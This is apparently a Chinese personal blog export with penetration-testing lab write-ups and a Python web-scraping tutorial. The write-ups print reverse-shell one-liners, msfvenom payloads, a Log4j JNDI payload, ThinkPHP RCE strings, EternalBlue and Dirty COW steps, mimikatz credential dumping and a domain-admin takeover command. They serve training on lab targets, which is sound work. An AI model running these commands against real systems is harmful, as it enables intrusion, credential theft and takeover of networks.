{"meta":{"title":"Blogs for JiangA23187","subtitle":"","description":"","author":"JiangA23187","url":"http://example.com","root":"/"},"pages":[{"title":"archives","date":"2022-10-09T07:43:00.000Z","updated":"2022-10-09T07:43:00.285Z","comments":true,"path":"archives/index.html","permalink":"http://example.com/archives/index.html","excerpt":"","text":""},{"title":"我的朋友们","date":"2022-10-09T07:50:17.188Z","updated":"2022-10-09T07:50:17.188Z","comments":true,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"这里写友链上方的内容。","text":"这里写友链上方的内容。 这里可以写友链页面下方的文字备注，例如自己的友链规范、示例等。"},{"title":"所有标签","date":"2022-10-09T13:27:38.762Z","updated":"2022-10-09T13:27:38.762Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"","date":"2022-10-09T11:54:13.142Z","updated":"2022-10-09T11:54:13.142Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":""},{"title":"所有分类","date":"2022-10-09T13:27:21.548Z","updated":"2022-10-09T13:27:21.548Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"Vulnhub靶场 实习线上面试环境","slug":"实习线上面试环境","date":"2022-11-17T07:36:41.027Z","updated":"2022-11-17T07:50:38.048Z","comments":true,"path":"2022/11/17/实习线上面试环境/","link":"","permalink":"http://example.com/2022/11/17/%E5%AE%9E%E4%B9%A0%E7%BA%BF%E4%B8%8A%E9%9D%A2%E8%AF%95%E7%8E%AF%E5%A2%83/","excerpt":"","text":"环境攻击机：192.168.189.129 靶机：192.168.189.136 题目一：命令执行访问http://192.168.189.136:64628/ 给出提示让我们用cmd参数执行命令 然后 就有了flag？ 题目二：ThinkphpRCEhttp://192.168.189.136:49171/ 访问后看到ico图标是thinkphp的 随手访问下&#x2F;index.php，报错获得版本号为5.1.30 搜下对应版本，发现该版本有一个RCE洞 百度找到了payload，联想之前flag是 ls &#x2F;tmp ，就执行ls &#x2F;tmp 1234?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls /tmp 题目三 ThinkPHP 3.x Log RCEhttp://192.168.189.136:55170/ 访问后一片空白，目录扫描扫到&#x2F;admin&#x2F;index.html，发现还是thinkphp 上工具扫一波漏洞，又一个rce 看日志太多了 ，利用工具直接getshell http://192.168.189.136:55170///?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Home/22_11_17.log pass&#x3D;peiqi 蚁剑连接后去tmp目录下寻找flag 题目四：内网目录遍历提示需要通过前面的shell进入内网进行测试 通过刚刚获取的shell上线msf 上线msfmsf生成木马 1msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.189.129 LPORT=7777 -f elf -o shell.elf msf设置监听 12345use exploit/multi/handlerset payload linux/x64/meterpreter/reverse_tcpset lport 7777set lhost 192.168.189.129run 上传木马并给予执行权限 12chmod +x shell.elf./shell.elf 成功获取shell 设置代理执行ifconfig发现该靶机在192.168.20网段有一张网卡 添加路由 run autoroute -s 192.168.20.0/24 扫描网段 12345use auxiliary/scanner/portscan/tcpset rhosts 192.168.20.0/24set ports 22,23,80,8080,3389,445,6379set threads 20run 设置socks代理 use auxiliary/server/socks_proxy 利用proxifier代理到本机 1.添加代理服务器 2.配置代理规则 访问上面扫到的端口 发现192.168.20.3对应题目四，是一个目录遍历 前往tmp获取flag emmm 这个靶场比较偏简单，适合初学内网的新手来打(ps 早知道这么简单就直接用插件代理流量了)","categories":[{"name":"靶场wp","slug":"靶场wp","permalink":"http://example.com/categories/%E9%9D%B6%E5%9C%BAwp/"}],"tags":[{"name":"靶场wp","slug":"靶场wp","permalink":"http://example.com/tags/%E9%9D%B6%E5%9C%BAwp/"}]},{"title":"python爬虫","slug":"爬虫学习","date":"2022-11-03T02:32:00.988Z","updated":"2022-11-03T02:37:06.819Z","comments":true,"path":"2022/11/03/爬虫学习/","link":"","permalink":"http://example.com/2022/11/03/%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"分类： 通用爬虫： 抓取系统重要组成部分，抓取互联网的一整张页面数据 聚焦爬虫: 抓取页面中特定的局部内容 增量式爬虫: 监测网站中数据更新情况，爬取最新更新的数据 requests模块指定url –&gt;发起请求–&gt;获取响应数据–&gt;持久化存储 项目1：简单get请求并在本地存储123456789url = &#x27;https://www.sogou.com/&#x27; #get请求 response = requests.get(url) #返回字符串形式响应数据 page_text = response.text print(page_text) #持久化存储 with open(&#x27;./1.html&#x27;,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;) as fp: fp.write(page_text) 项目2：关键词搜索界面爬取requests.get(url,param) **param:**请求参数,数据类型为字典 UA伪装：让爬虫对应的请求数据伪装为一款浏览器，伪装user-agent 12345678910111213141516import requestsif __name__ == &quot;__main__&quot;: header=&#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&#x27; &#125; url=&#x27;https://www.sogou.com/web&#x27; kw = input(&#x27;inter your word:&#x27;) param=&#123; &#x27;query&#x27;:kw &#125; response = requests.get(url,params=param,headers=header) page_text= response.text fileName = kw + &#x27;.html&#x27; with open(fileName,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;) as fp: fp.write(page_text) print(fileName,&#x27;保存成功&#x27;) 项目3：有道翻译ajax请求：是一种在无需重新加载整个网页的情况下能够更新部分网页的技术。 定位请求数据包方法： 数据局部修改查看Fetch&#x2F;XHR请求 谷歌浏览器右键检查 F12 网络筛选 查看载荷定位数据包（这里定位为langdetect数据包） 123456789101112131415161718192021222324252627282930313233343536373839import jsonimport requestsimport time,random,hashliblts = str(int(time.time()*1000))salt = lts + str(random.randint(0,9))i = input(&#x27;输入你要翻译的句子：&#x27;)sign_str = &#x27;fanyideskweb&#x27; + i + salt + &#x27;Ygy_4c=r#e#4EX^NUGUc5&#x27;m = hashlib.md5()m.update(sign_str.encode())sign = m.hexdigest()url=&#x27;https://fanyi.youdao.com/translate_o?smartresult=dict&amp;smartresult=rule&#x27;data=&#123; &quot;i&quot;: i, &quot;from&quot;: &quot;AUTO&quot;, &quot;to&quot;: &quot;AUTO&quot;, &quot;smartresult&quot;: &quot;dict&quot;, &quot;client&quot;: &quot;fanyideskweb&quot;, &quot;salt&quot;: salt, &quot;sign&quot;: sign, &quot;lts&quot;: lts, &quot;bv&quot;: &quot;4b14f827cdc3aab7d8d501b4087648f8&quot;, &quot;doctype&quot;: &quot;json&quot;, &quot;version&quot;: &quot;2.1&quot;, &quot;keyfrom&quot;: &quot;fanyi.web&quot;, &quot;action&quot;: &quot;FY_BY_REALTlME&quot;,&#125;headers = &#123; &quot;Referer&quot;: &quot;https://fanyi.youdao.com/&quot;, &quot;Cookie&quot;: &quot;OUTFOX_SEARCH_USER_ID=-1124603977@10.108.162.139; JSESSIONID=aaamH0NjhkDAeAV9d28-x; OUTFOX_SEARCH_USER_ID_NCOO=1827884489.6445506; fanyi-ad-id=305426; fanyi-ad-closed=1; ___rl__test__cookies=1649216072438&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36&quot;&#125;res = requests.post(url,headers=headers,data=data)res_json=res.json()print(res.json())fileName = i + &#x27;.json&#x27;fp = open(fileName,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;)json.dump(res_json,fp=fp,ensure_ascii=False)print(&#x27;over&#x27;) 项目4：豆瓣电影分类排行榜滚轮拖动到底部，又加载出一批新数据 -&gt;页面局部刷新 -&gt;ajax请求 12345678910111213141516171819import jsonimport requestsurl=&#x27;https://movie.douban.com/j/chart/top_list&#x27;header=&#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&#x27; &#125;param=&#123; &#x27;type&#x27;: &#x27;24&#x27;, &#x27;interval_id&#x27;: &#x27;100:90&#x27;, &#x27;action&#x27;:&#x27;&#x27;, &#x27;start&#x27;: &#x27;0&#x27;,#从库中第几部开始取 &#x27;limit&#x27;: &#x27;20&#x27;,#一次取的个数&#125;res=requests.get(url,params=param,headers=header)res_json=res.json()fp = open(&#x27;电影.json&#x27;,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;)json.dump(res_json,fp=fp,ensure_ascii=False)print(&#x27;over&#x27;) 项目5：肯德基餐厅查询1234567891011121314151617import requests,jsonurl=&#x27;http://www.kfc.com.cn/kfccda/ashx/GetStoreList.ashx?op=keyword&#x27;header=&#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&#x27;&#125;param=&#123; &#x27;cname&#x27;: &#x27;柳州&#x27;, &#x27;pid&#x27;: &#x27;&#x27;, &#x27;keyword&#x27;: &#x27;&#x27;, &#x27;pageIndex&#x27;: &#x27;1&#x27;, &#x27;pageSize&#x27;: &#x27;10&#x27;&#125;res=requests.post(url,params=param,headers=header)res_json=res.json()fp = open(&#x27;place.json&#x27;,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;)json.dump(res_json,fp=fp,ensure_ascii=False)print(&#x27;over&#x27;) 分类: 正则 bs4 xpath 原理 数据存储在标签之间或者标签对应的属性中存储 1.进行指定标签定位 2.将标签或者标签所对应的数据中存储的数据进行提取 正则表达式:使用re库 图片爬取与本地化存储图片数据爬取后用**.content**可以输出以二进制形式保存的数据 利用**’wb’:**以二进制形式打开并写入 12345import requestsurl=&#x27;https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202210101606312.png&#x27;res = requests.get(url=url).contentwith open(&#x27;./tp.png&#x27;,&#x27;wb&#x27;,) as fp: fp.write(res) 数据解析bs4解析 相关函数： find函数： 标签定位： soup.find(‘div’):寻找出现的第一个div标签 属性定位： soup.find(‘div’,class_&#x3D;’tang’):寻找class属性值为tang的标签 soup.find_all(‘div’):找到符合要求的所有标签 select函数: soup.select(‘某种选择器(id，class，标签……)’):返回一个列表 层级选择器： soup.select(‘ .tang &gt; ul &gt; li &gt; a ‘):每个&gt;表示一个层级 soup.select(‘ .tang &gt; ul a ‘):空格表示多个层级 获取标签之间的文本数据： -soup.a.text&#x2F;string&#x2F;get_text() -text&#x2F;get_text():获取一个标签中所有文本内容 -string：只可以获取该标签下的直系文本内容 获取标签中的属性值 soup.a[‘href’]:获取a标签下的href属性值 123456789101112131415161718&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;meta charset=&quot;UTF-8&quot;/&gt;&lt;title&gt;测试bs4&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div&gt;&lt;p&gt;百里守约&lt;/p&gt;&lt;/div&gt;&lt;div class=&quot;song&quot;&gt;&lt;p&gt;李清照&lt;/p&gt;&lt;p&gt;王安石&lt;/p&gt;&lt;p&gt;苏轼&lt;/p&gt;&lt;p&gt;柳宗元&lt;/p&gt;&lt;a href=&quot;http: //www.song.com/&quot; title=&quot;赵匡胤&quot; target=&quot;_self&quot;&gt;&lt;span&gt;this is span&lt;/span&gt;宋朝是最强大的王朝，不是军队的强大，而是经济很强大，国民都很有钱&lt;/a&gt;&lt;a href=&quot; &quot; class=&quot;du&quot;&gt;总为浮云能蔽日，长安不见使人愁&lt;/a&gt;&lt;img src=&quot;http:// www.baidu.com/meinv.jpg&quot; alt=&quot;&quot;/&gt;&lt;/div&gt;&lt;div class=&quot;tang&quot;&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot; http://w.baidu.com&quot; title= &quot;ging&quot;&gt;清明时节雨纷纷,路上行人欲断魂，借问酒家何处有,牧童遥指杏花村&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot; http://ww.163.com&quot; title=&quot;gin&quot;&gt;秦时明月汉时关,万里长征人未还,但使龙城飞将在，不教胡马度阴山&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href= &quot;http://ww.126.com&quot; alt=&quot;gqi &quot;&gt;岐王宅里寻常见，崔九堂前几度闻，正是江南好风景,落花时节又逢君&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http: //www.sina.com&quot; class=&quot;du&quot;&gt;杜甫&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http: / / www.dudu.com&quot; class=&quot;du&quot;&gt;杜牧&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;b&gt;杜小月&lt;/b&gt;&lt;/li&gt;&lt;li&gt;&lt;i&gt;度蜜月&lt;/i&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http:.//w.haha.com&quot; id=&quot;feng&quot;&gt;凤凰台上凤凰游，凤去台空江自流，吴宫花草埋幽径,晋代衣冠成古丘&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 流程图： 项目1：爬取三国演义小说标题所有的章节标题和内容请求分析： 请求方式为get 标题数据位于’.book-mulu &gt; ul &gt; li &gt; a’的内容中 网页数据位于’.book-mulu &gt; ul &gt; li &gt; a’的href值中 用如下代码筛选获取标题和url内容 1234for li in res: urls = li.a[&#x27;href&#x27;] detail_urls = &#x27;https://www.shicimingju.com&#x27;+ urls title = li.a.string 对目的url进行分析 其文本内容位于div标签中class&#x3D;’.chapter_content ‘中 对文本进行筛选 1res_page = detail_soup.select(&#x27;div &gt; div &gt; div &gt;div.chapter_content&#x27;) 最终代码 1234567891011121314151617181920212223242526272829import requests,timefrom bs4 import BeautifulSoupurl = &#x27;https://www.shicimingju.com/book/sanguoyanyi.html&#x27;header = &#123; &#x27;User-Agent&#x27; : &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&#x27;&#125;res_content = requests.get(url=url,headers=header).content#将数据实例化为BeautifulSoup对象soup = BeautifulSoup(res_content, &#x27;lxml&#x27;)#进行数据筛选res = soup.select(&#x27;.book-mulu &gt; ul &gt; li&#x27;)fp = open(&#x27;./sanguo.txt&#x27;,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;)for li in res: urls = li.a[&#x27;href&#x27;] detail_urls = &#x27;https://www.shicimingju.com&#x27;+ urls title = li.a.string #请求对应url,获取内容 res_page_content = requests.get(url=detail_urls,headers=header).content #每次请求延迟一秒防止请求过于频繁导致ip被加入黑名单 time.sleep(1) #实例化一个BeautifulSoup对象 detail_soup = BeautifulSoup(res_page_content, &#x27;lxml&#x27;) res_page = detail_soup.select(&#x27;div &gt; div &gt; div &gt;div.chapter_content&#x27;) #解析章节内容 for data in res_page: fp.write(str(title)+&#x27;:&#x27;+data.text+&#x27;\\n&#x27;) print(str(title)+&#x27; 爬取成功\\n&#x27;)fp.close() 遇到的问题： 1.res_page不能直接加’.text’打印信息，报错：AttributeError: ResultSet object has no attribute ‘text‘ 解决： print(res_page.text)错误，res_page本身是 ResultSet 类型，无.text属性，想要打印信息使用 12for data in res_page: print(data.text) 2.res_page &#x3D; detail_soup.find(‘div’, _class &#x3D; ‘chapter_content’)返回None，但是数据存在。 暂时未解决，更换select函数进行筛选 xpath解析最常用且最便捷高效的一种解析方式，通用性最强，能在多种语言中使用 原理： 1.实例化etree的对象且需要将被解析的页面源码数据加载到该对象中 2.调用etree对象中的xpath方法结合xpath表达式实现标签定位和内容捕获 导入数据包 1from lxml import etree 实例化etree对象（from lxml import etree） 1.将本地的html文档中源码数据加载到etree对象中： 12html = etree.parse(&#x27;./test.html&#x27;, etree.HTMLParser()) # html.xpath(&#x27;xpath表达式&#x27;) 2.将互联网中获取的数据加载到该对象中 12html = etree.HTML(&#x27;page_data&#x27;) # page_data为从页面获取的源码数据html.xpath(&#x27;xpath表达式&#x27;) xpath常用表达式表达式 含义nodename 选取此节点的所有子节点&#x2F; 表示的是从根节点开始定位。表示的是一个层级&#x2F;&#x2F; 从当前节点选取子孙节点（后代）. 选取当前节点@ 选取属性 (&#x2F;@attrName)text() 获取文本,返回一个列表 ​ &#x2F;text()获取标签中直系文本内容 ​ &#x2F;&#x2F;text()获取标签中所有文本内容 * 通配符，任何元素节点 属性定位： tag[@Name&#x3D;‘value’] 选取给定属性具有给定值的指定元素。 如 div[@class&#x3D;‘cell’] 表示 class 属性的值为 cell 的所有 div 元素 索引定位： div[@class&#x3D;‘cell’]&#x2F;a[2] 表示 class 属性的值为 cell 的所有 div 元素下的第二个a元素。 &#x2F;&#x2F;div[@class&#x3D;”song”]&#x2F;img&#x2F;@src 获取img标签中src属性的值 多层级解析用’|’分割，如：li.xpath(‘&#x2F;&#x2F;ul[“@class&#x3D;clearfix”]&#x2F;li&#x2F;&#x2F;img&#x2F;@src | &#x2F;&#x2F;ul[“@class&#x3D;clearfix”]&#x2F;li&#x2F;&#x2F;img&#x2F;@alt ） 项目2：爬取58二手房的房源信息构造xpath表达式： title信息位于class属性为“property-content-title”的div标签的title属性中 编写xpath表达式如下 tree.xpath(&#39;//div[@class=&quot;property-content-title&quot;]//@title&#39;) 完整代码 123456789101112from lxml import etreeimport requestsurl = &#x27;https://liuzhou.58.com/ershoufang/&#x27;header = &#123; &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&#x27;&#125;res = requests.get(url=url,headers=header).texttree = etree.HTML(res)text = tree.xpath(&#x27;//div[@class=&quot;property-content-title&quot;]//@title&#x27;)#持久化存储fp = open(&#x27;58.txt&#x27;,&#x27;w&#x27;,encoding = &#x27;utf-8&#x27;)fp.write(text+&#x27;\\n&#x27;) 项目3：爬取图片网站略缩图http://pic.netbian.com/4kdongman/ 构造xpath表达式 需要解析src值和alt值，这两个元素位于class值为clearfix的ul标签下的li标签中 tree.xpath(&#39;//ul[&quot;@class=clearfix&quot;]/li&#39;) 利用循环取出url和title 123title = li.xpath(&#x27;//ul[&quot;@class=clearfix&quot;]/li//@alt&#x27;)[i]+ &#x27;.jpg&#x27;title = title.encode(&#x27;iso-8859-1&#x27;).decode(&#x27;gbk&#x27;)urls = &#x27;http://pic.netbian.com/4kdongman/&#x27; + li.xpath(&#x27;//ul[&quot;@class=clearfix&quot;]/li//img/@src&#x27;)[i] 运行后title出现乱码 查看浏览器header头发现编码方式为’gbk’ 直接将resquest返回数据编码方式改为gbk报错 解决方法： 通用中文乱码解决方案 title = title.encode(&#39;iso-8859-1&#39;).decode(&#39;gbk&#39;) 最终代码 1234567891011121314151617181920212223242526272829import requestsfrom lxml import etreeimport osurl=&#x27;http://pic.netbian.com/4kdongman/&#x27;header = &#123; &#x27;User-Agent&#x27; : &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&#x27;&#125;res = requests.get(url=url,headers=header).texttree = etree.HTML(res)text = tree.xpath(&#x27;//div[&quot;@class=slist&quot;]/ul/li&#x27;)i = 0for li in text: title = li.xpath(&#x27;//ul[&quot;@class=clearfix&quot;]/li//@alt&#x27;)[i]+ &#x27;.jpg&#x27; title = title.encode(&#x27;iso-8859-1&#x27;).decode(&#x27;gbk&#x27;) img_urls = &#x27;http://pic.netbian.com&#x27; + li.xpath(&#x27;//ul[&quot;@class=clearfix&quot;]/li//img/@src&#x27;)[i] img_data = requests.get(url=img_urls,headers=header).content #创建文件夹 if not os.path.exists(&#x27;./Pic&#x27;): os.mkdir(&#x27;./Pic&#x27;) # 持久化存储 img_path = &#x27;Pic/&#x27;+title with open(img_path,&#x27;wb&#x27;) as fp: fp.write(img_data) print(title + &#x27;下载成功&#x27;) if i &lt; 19: i = i + 1#每页图片共20张 else: break 爬取多页 123456789101112131415161718192021222324252627282930313233343536import requestsfrom lxml import etreeimport osdef download(url): header = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&#x27; &#125; res = requests.get(url=url, headers=header).text tree = etree.HTML(res) text = tree.xpath(&#x27;//div[&quot;@class=slist&quot;]/ul/li&#x27;) i = 0 for li in text: title = li.xpath(&#x27;//ul[&quot;@class=clearfix&quot;]/li//@alt&#x27;)[i] + &#x27;.jpg&#x27; title = title.encode(&#x27;iso-8859-1&#x27;).decode(&#x27;gbk&#x27;) img_urls = &#x27;http://pic.netbian.com&#x27; + li.xpath(&#x27;//ul[&quot;@class=clearfix&quot;]/li//img/@src&#x27;)[i] img_data = requests.get(url=img_urls, headers=header).content # 创建文件夹 if not os.path.exists(&#x27;./Pic&#x27;): os.mkdir(&#x27;./Pic&#x27;) # 持久化存储 img_path = &#x27;Pic/&#x27; + title with open(img_path, &#x27;wb&#x27;) as fp: fp.write(img_data) print(title + &#x27;下载成功&#x27;) if i &lt; 19: i = i + 1#每页图片共20张 else: breakfor page in range(1,3): if page == 1: url = &#x27;http://pic.netbian.com/4kmeinv/&#x27;#第一页和后续页面url格式不一致 else: url=&#x27;http://pic.netbian.com/4kmeinv/index_&#x27;+str(page)+&#x27;.html&#x27; download(url)","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"python开发","slug":"python开发","permalink":"http://example.com/tags/python%E5%BC%80%E5%8F%91/"}]},{"title":"Readteam2靶场","slug":"Readteam2","date":"2022-10-12T14:34:50.744Z","updated":"2022-10-13T03:27:19.042Z","comments":true,"path":"2022/10/12/Readteam2/","link":"","permalink":"http://example.com/2022/10/12/Readteam2/","excerpt":"","text":"Readteam2 端口扫描对主机进行全端口扫描，发现开启了 22 和 38080端口 1nmap 192.168.31.132 -A -p 1-65535` 访问 38080端口，是springboot的http服务 目录扫描未发现未授权 外网服务器权限利用log4j2反弹shell攻击机本地搭建jndi服务 1java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 192.168.31.31 攻击机设置监听7777端口 1nc -lvvp 7777 反弹shell 1/bin/bash -i &gt;&amp; /dev/tcp/192.168.31.31/7777 0&gt;&amp;1 将base64编码后的反弹shell语句放入下列payload中 1payload=$&#123;jndi:ldap://192.168.31.31:1389/TomcatBypass/Command/Base64/L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMzEvNzc3NyAwPiYx&#125; 向192.168.132:38080&#x2F;hello发送POST请求，参数为payload，成功获取shell 在root路径下获取第一个flag 同时还有一串疑似密码的字符串 判断是否处于docker环境中 1cat /proc/1/cgroup 发现我们处于docker环境中 SSH登录这时候想到该主机还开放了22端口，刚刚flag.txt中还有一串类似一账号密码的字符串，尝试着登录下 1ssh saul@192.168.31.132 成功登录该主机 域内个人主机权限信息收集发现两张网卡 192.168.31.132 10.0.1.6 使用工具:scaninfo 1./scaninfo_linux_x64 -i 10.0.1.0/24 发现10.0.1.7存在ms17-010漏洞 使用Frp进行代理攻击机开启http服务 1python3 -m http.server 1111 靶机访问该服务下载Frp 1wget 192.168.31.31:1111/frp_0.44.0_linux_amd64.tar.gz 解压 1tar -xvf frp_0.44.0_linux_amd64.tar.gz 删除原本的配置文件，上传frpc.ini 内容如下 1234567891011121314[common]tls_enable = trueserver_addr = 192.168.1.105 server_port = 8000 token = 1q2w3e pool_count = 5 protocol = tcp health_check_type = tcp health_check_interval_s = 100 [proxies]remote_port = 6000 plugin = socks5 use_encryption = true use_compression = true 配置本地frps.ini 内容如下 12345678910[common]bind_addr = 0.0.0.0 bind_port = 8000 dashboard_addr = 0.0.0.0 dashboard_port = 7600 dashboard_user = root dashboard_pwd = 123456 token = 1q2w3e heartbeat_timeout = 90 max_pool_count = 5 攻击机执行./frps -c frps.ini 靶机执行./frpc -c frpc.ini MS17-010利用MSF设置Socks5代理 12setg Proxies socks5:127.0.0.1:6000set ReverseAllowProxy true//允许反向代理 设置MS17-010利用模块 123use exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/bind_tcp//由于目标处于内网，无法反向连接set rhost 10.0.1.7 成功反弹 主机为win7，在桌面上找到flag 域控权限添加路由： run autoroute -s 10.0.0.7/24 信息收集利用mimikatz抓取凭据12load mimikatzcreds_all 获取密码Red12345 ipconfig发现新网卡10.0.0.7 上传fscan进行扫描修改编码chcp 65001 upload fscan64.exe fscan64.exe fscan64.exe -h 10.0.0.0/24 发现DC主机10.0.0.12同样存在MS17-010漏洞 MS17-010利用（失败）MSF添加路由 123use post/multi/manage/autorouteset session 1run 未运行成功 CVE-2021-42287&#x2F;CVE-2021-42278设置socks代理 12use auxiliary/server/socks_proxyrun 更改本地代理配置与msf中设置对应 vim /etc/proxychains4.conf 漏洞利用脚本(前提：一个域用户的账密) https://github.com/WazeHell/sam-the-admin 1proxychains4 python3 sam_the_admin.py &quot;redteam/root:Red12345&quot; -dc-ip 10.0.0.12 -shell 成功获得shell 由于该脚本采用的SMB协议，不能使用cd命令 type C:\\\\Users\\Administrator\\Desktop\\flag.txt&#x2F;&#x2F;读取flag 成功！！！！！！","categories":[{"name":"靶场wp","slug":"靶场wp","permalink":"http://example.com/categories/%E9%9D%B6%E5%9C%BAwp/"}],"tags":[{"name":"靶场wp","slug":"靶场wp","permalink":"http://example.com/tags/%E9%9D%B6%E5%9C%BAwp/"},{"name":"权限提升","slug":"权限提升","permalink":"http://example.com/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"},{"name":"域渗透","slug":"域渗透","permalink":"http://example.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"},{"name":"log4j2","slug":"log4j2","permalink":"http://example.com/tags/log4j2/"}]},{"title":"vulhub靶场 Lampião","slug":"vulhub靶场-Lampião  wp","date":"2022-10-10T09:01:25.568Z","updated":"2022-10-18T13:26:47.839Z","comments":true,"path":"2022/10/10/vulhub靶场-Lampião  wp/","link":"","permalink":"http://example.com/2022/10/10/vulhub%E9%9D%B6%E5%9C%BA-Lampi%C3%A3o%20%20wp/","excerpt":"","text":"攻击机：192.168.189.129 靶机：192.168.189.137 主机探测：nmap 192.168.189.0/24 发现靶机192.168.189.137 外网打点访问80端口： 目录扫描 目录扫描工具报错，无法进行扫描 进行全端口扫描 nmap 192.168.189.137 -p 1-65535 发现端口1898 访问对应端口，发现为Drupal框架 目录扫描发现有CHANGELOG.txt文件 访问得到Drupal版本为7.54 百度一下历史漏洞 发现存在CVE-2018-7600远程代码执行漏洞 MSF查找对应漏洞（都是2018年的,应该就是这个,试试先） 1234use exploit/unix/webapp/drupal_drupalgeddon2set rhosts 192.168.189.137set rport 1898run 成功接收到反弹会话 权限提升查看权限为www-data 上传漏洞探针 1234upload linux-exploit-suggester.sh /tmp/a.shshellchmod +x a.sh./a.sh 发现了一堆可能的漏洞，这里使用脏牛漏洞进行提权 将40847.cpp复制到桌面 1cp /usr/share/exploitdb/exploits/linux/local/40847.cpp . 上传至靶机并编译执行 123upload 40847.cpp /tmp/40847.cppg++ -O2 -std=c++11 -pthread -o 40847 40847.cpp -lutil./40847 su密码被更改为dirtyCowFun 执行su命令报错 需要利用python做一个伪终端，否则不能使用su命令 1python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27; 成功提权","categories":[{"name":"靶场wp","slug":"靶场wp","permalink":"http://example.com/categories/%E9%9D%B6%E5%9C%BAwp/"}],"tags":[{"name":"靶场wp","slug":"靶场wp","permalink":"http://example.com/tags/%E9%9D%B6%E5%9C%BAwp/"},{"name":"权限提升","slug":"权限提升","permalink":"http://example.com/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"}]},{"title":"Vulnhub靶场 Social-Network","slug":"BoredHackerBlog-social_network","date":"2022-10-09T11:19:10.998Z","updated":"2022-10-09T11:19:31.988Z","comments":true,"path":"2022/10/09/BoredHackerBlog-social_network/","link":"","permalink":"http://example.com/2022/10/09/BoredHackerBlog-social_network/","excerpt":"","text":"环境192.168.44.130 192.168.44.128 攻击机192.168.44.135 靶机 1.主机发现通过nmap扫描网段，发现靶机ip和开放端口，并得知靶机5000端口是基于python开发的web系统nmap 192.168.44.0/24 -A 2.目录扫描访问对应服务，是一个匿名评论平台 上传了几条xss均失败，也没啥可利用的点，就试着扫描下目录访问&#x2F;admin目录，好家伙，直接命令执行了测试了一下，没有回显，直接反弹shell吧 3.反弹shell既然知道该站点是基于python开发的，就找找python反弹shell的payload这里推荐一个反弹shell命令生成的站点：https://forum.ywhack.com/shell.php kali攻击机先开启监听 执行反弹shell命令 1import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.44.130&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]); kali收到反弹的shell 4.内网渗透查看当前路径发现dockerfile文件，但不完全确定是否处于docker环境，百度查了下，找到以下三种确定方法方法1：如果根目录下存在dockerenv，那么有极大的概率，我们是在docker环境中方法2：查看ip，如果ip与网站ip不同，那么有极大的概率，我们是在docker环境中方法3：如果&#x2F;proc&#x2F;1&#x2F;cgroup文件里面可以看到docker，以及docker的hash值。那么我们一定在docker环境中。 使用方法3查看，确认我们处于docker环境中 使用msf重新生成反弹shellmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.44.130 LPORT=8888 -f elf 